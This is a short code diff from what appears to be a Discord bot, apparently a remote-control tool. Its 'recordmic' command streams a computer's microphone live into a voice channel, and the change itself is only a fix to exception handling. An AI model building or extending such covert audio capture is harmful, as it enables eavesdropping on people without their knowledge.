@@ -1031,7 +1031,7 @@ async def recordmic(ctx, user):
             vc.play(PyAudioPCM())
             await ctx.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
 
-        except Exception:
+        except Exception as e:
             await ctx.send("Error: " + str(e))
 
 
